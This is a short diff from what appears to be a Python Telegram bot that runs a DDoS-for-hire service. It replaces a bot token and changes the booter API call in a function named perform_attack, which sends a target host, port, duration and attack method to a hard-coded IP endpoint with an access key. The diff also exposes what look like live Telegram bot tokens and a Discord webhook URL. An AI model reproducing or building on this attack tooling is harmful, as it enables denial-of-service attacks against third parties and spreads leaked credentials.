@@ -13,7 +13,7 @@ from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton
 
 
 webhook_url = 'https://discord.com/api/webhooks/1167527671723471019/f0E_LJJmER0l42teqg8yl_XWBOssLjfcBHzpnXrkykgnRey0ioS4rLgx2pxsIHW6o0RA'  # discord webhook here
-TOKEN = '6907590527:AAHbVoZRxDr4rlPnYvGVbZWmWnXtBHJZ1CA'  # your bot token here
+TOKEN = '6494761744:AAFplOtZKedmsaQmzJrbxMlUskfOaku7fBw'  # your bot token here
 
 attack_slots = 10
 attack_slots_lock = threading.Lock()
@@ -326,7 +326,7 @@ def perform_attack(target, port, duration, method, user_id):
     concurrents = info['concurrents']
     user_attack_slots = info.get('attack_slots', 0)
     
-    url = f'http://137.184.87.115:1337/api?key={KEY}&host={HOST}&port={PORT}&time={TIME}&method={METHOD}'  # Perbaikan disini
+    url = f'http://137.184.87.115:7979/api?key=vvip&host={HOST}&port={PORT}&time={TIME}&method={METHOD}'  # Perbaikan disini
     response = requests.get(url)
     response_text = response.text
     
